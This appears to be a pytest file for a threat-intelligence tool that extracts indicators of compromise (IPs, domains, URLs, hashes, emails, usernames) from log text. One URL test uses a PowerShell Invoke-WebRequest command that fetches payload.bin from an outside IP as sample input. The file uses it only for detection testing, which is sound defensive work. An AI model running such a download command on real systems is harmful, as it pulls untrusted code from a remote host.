from app.ioc import domain, email, file_hash, ipv4, ipv6, url, username
from app.models.enums import IOCType, ValidationStatus


class TestIPv4:
    def test_scan_finds_public_ip(self):
        found = ipv4.scan("connection from 185.220.101.5 observed")
        assert len(found) == 1
        assert found[0].value == "185.220.101.5"
        assert found[0].ioc_type == IOCType.IPV4
        assert found[0].confidence == 0.7

    def test_scan_filters_private_addresses(self):
        assert ipv4.scan("internal host 10.0.0.5 talked to 192.168.1.1") == []

    def test_scan_filters_loopback(self):
        assert ipv4.scan("bound to 127.0.0.1") == []

    def test_scan_deduplicates_repeated_matches(self):
        found = ipv4.scan("185.220.101.5 then again 185.220.101.5")
        assert len(found) == 1

    def test_from_field_accepts_private_address(self):
        candidate = ipv4.from_field("10.0.0.5")
        assert candidate is not None
        assert candidate.confidence == 1.0
        assert candidate.validation_status == ValidationStatus.VALID

    def test_from_field_rejects_malformed_value(self):
        assert ipv4.from_field("not-an-ip") is None


class TestIPv6:
    def test_scan_finds_public_address(self):
        found = ipv6.scan("resolver replied with 2606:4700:4700::1111 for the query")
        assert len(found) == 1
        assert found[0].ioc_type == IOCType.IPV6

    def test_scan_filters_loopback(self):
        assert ipv6.scan("bound to ::1") == []

    def test_from_field_accepts_documentation_range(self):
        candidate = ipv6.from_field("2001:db8:1234:5678::10")
        assert candidate is not None
        assert candidate.confidence == 1.0


class TestDomain:
    def test_scan_finds_plausible_domain(self):
        found = domain.scan("beaconing to malicious-redirect.example over https")
        assert len(found) == 1
        assert found[0].value == "malicious-redirect.example"
        assert found[0].confidence == 0.6

    def test_scan_ignores_reserved_tlds(self):
        assert domain.scan("connected to host01.internal") == []
        assert domain.scan("query for db.local failed") == []

    def test_scan_ignores_file_extensions_that_look_like_domains(self):
        assert domain.scan(r"saved to C:\Temp\payload.bin") == []
        assert domain.scan("launched powershell.exe with flags") == []

    def test_scan_does_not_match_bare_ip_addresses(self):
        assert domain.scan("connection to 185.220.101.5 observed") == []

    def test_from_field_valid_domain(self):
        candidate = domain.from_field("cdn-update-service.example")
        assert candidate is not None
        assert candidate.confidence == 1.0
        assert candidate.validation_status == ValidationStatus.VALID

    def test_from_field_reserved_tld_marked_invalid(self):
        candidate = domain.from_field("intranet.corp.internal")
        assert candidate is not None
        assert candidate.validation_status == ValidationStatus.INVALID


class TestURL:
    def test_scan_finds_url_in_command_line(self):
        found = url.scan(
            'powershell.exe -Command "Invoke-WebRequest -Uri http://185.220.101.5/payload.bin"'
        )
        assert len(found) == 1
        assert found[0].value == "http://185.220.101.5/payload.bin"

    def test_scan_trims_trailing_punctuation(self):
        found = url.scan("see http://example.com/path).")
        assert found[0].value == "http://example.com/path"

    def test_scan_ignores_plain_text(self):
        assert url.scan("no links here, just words") == []


class TestFileHash:
    def test_scan_classifies_by_length(self):
        md5 = "d41d8cd98f00b204e9800998ecf8427e"[:32]
        sha1 = "da39a3ee5e6b4b0d3255bfef95601890afd80709"
        sha256 = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        found = file_hash.scan(f"{md5} {sha1} {sha256}")
        types = {f.ioc_type for f in found}
        assert types == {IOCType.FILE_HASH_MD5, IOCType.FILE_HASH_SHA1, IOCType.FILE_HASH_SHA256}

    def test_scan_ignores_wrong_length_hex(self):
        assert file_hash.scan("deadbeef") == []

    def test_scan_lowercases_value(self):
        found = file_hash.scan("E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855")
        assert found[0].value == found[0].value.lower()


class TestEmail:
    def test_scan_finds_email(self):
        found = email.scan("reset requested for victim@example.com today")
        assert len(found) == 1
        assert found[0].value == "victim@example.com"

    def test_scan_ignores_text_without_at_sign(self):
        assert email.scan("no email here") == []


class TestUsername:
    def test_from_field_accepts_value(self):
        candidate = username.from_field("jdoe")
        assert candidate is not None
        assert candidate.ioc_type == IOCType.USERNAME
        assert candidate.confidence == 1.0

    def test_from_field_rejects_empty_string(self):
        assert username.from_field("   ") is None
